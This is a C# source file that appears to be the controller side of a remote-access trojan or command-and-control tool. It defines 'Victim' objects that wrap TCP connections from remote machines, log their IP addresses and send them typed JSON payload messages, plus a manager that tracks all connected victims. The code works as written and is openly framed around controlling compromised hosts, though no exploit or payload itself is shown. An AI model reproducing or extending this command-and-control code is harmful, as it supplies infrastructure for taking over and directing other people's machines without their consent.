using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;

namespace Controller.Models
{

    public interface IVictim
    {
        Task SendMessageAsync<T>(string messageType, T payload);
        NetworkStream Stream { get; }
        void DisconnectAsync();
        string Id { get; }
    }

    public class Victim : IVictim
    {
        private bool initDone = false;
        private readonly TcpClient client;
        private readonly JsonSerializerOptions jsonOptions;

        public string Id { get; }
        public string IP { get; }
        public InitMSG? Prop { get; private set; }

        public NetworkStream Stream { get; }

        public Victim(TcpClient client)
        {
            this.client = client;
            Stream = client.GetStream();
            Id = Guid.NewGuid().ToString();
            IP = ((IPEndPoint?)client.Client.RemoteEndPoint)?.Address?.ToString() ?? "Unknown";

            jsonOptions = new JsonSerializerOptions
            {
                PropertyNameCaseInsensitive = true
            };
        }

        public void Init(InitMSG? imsg)
        {
            if (initDone) return;
            initDone = true;
            Prop = imsg;
        }

        public async Task SendMessageAsync<T>(string messageType, T payload)
        {
            var message = new MSG<T>
            {
                Type = messageType,
                Payload = payload
            };

            var json = JsonSerializer.Serialize(message, jsonOptions);
            var messageBytes = Encoding.UTF8.GetBytes(json);
            var lengthBytes = BitConverter.GetBytes(messageBytes.Length);

            if (BitConverter.IsLittleEndian)
            {
                Array.Reverse(lengthBytes);
            }

            await Stream.WriteAsync(lengthBytes);
            await Stream.WriteAsync(messageBytes);
        }

        public void DisconnectAsync()
        {
            Stream.Close();
            client.Close();
        }
    }

    public class VictimManager
    {
        private readonly Dictionary<string, IVictim> clients = [];
        private readonly Lock clientLock = new();

        public void AddClient(IVictim client)
        {
            lock (clientLock)
            {
                clients[client.Id] = client;
            }
        }

        public void RemoveClient(string clientId)
        {
            lock (clientLock)
            {
                clients.Remove(clientId);
            }
        }

        public IEnumerable<IVictim> GetAllClients()
        {
            lock (clientLock)
            {
                return [.. clients.Values];
            }
        }
    }

}
